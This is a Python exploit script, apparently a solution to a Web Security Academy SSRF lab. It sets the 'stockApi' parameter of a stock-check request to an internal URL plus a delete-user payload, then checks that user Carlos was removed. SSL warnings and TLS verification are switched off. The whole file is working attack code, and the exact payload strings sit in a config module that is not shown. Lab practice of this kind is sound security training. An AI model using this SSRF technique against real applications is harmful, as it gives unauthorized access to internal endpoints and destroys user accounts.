'''
This automation helps us in ssrf attack on localhost of the application
makes use of the cart item info as reference url and hits a delete user 
url. thus explots the application.
python3 lab01.py "url to be exploited"
url: https://0a0f002e037ee37481a27a9600d10011.web-security-academy.net/
'''
import requests
import sys
import urllib3
import config

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def delete_user(url):
    param = {'stockApi': config.stock_check_url + config.delete_user_payload}
    r = requests.post(url + config.stock_path, data=param, verify=False, proxies=config.proxies)

    # Check if the user "Carlos" is deleted on the page to ensure the SSRF attack is successful
    param2 = {'stockApi': config.stock_check_url}
    r = requests.post(url + config.stock_path, data=param2, verify=False, proxies=config.proxies)
    if 'User deleted successfully' in r.text:
        print("User Carlos deleted successfully")
    else:
        print("Exploit was unsuccessful")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(0)
    url = sys.argv[1]
    print("Deleting Carlos user....")
    delete_user(url)

if __name__ == "__main__":
    main()
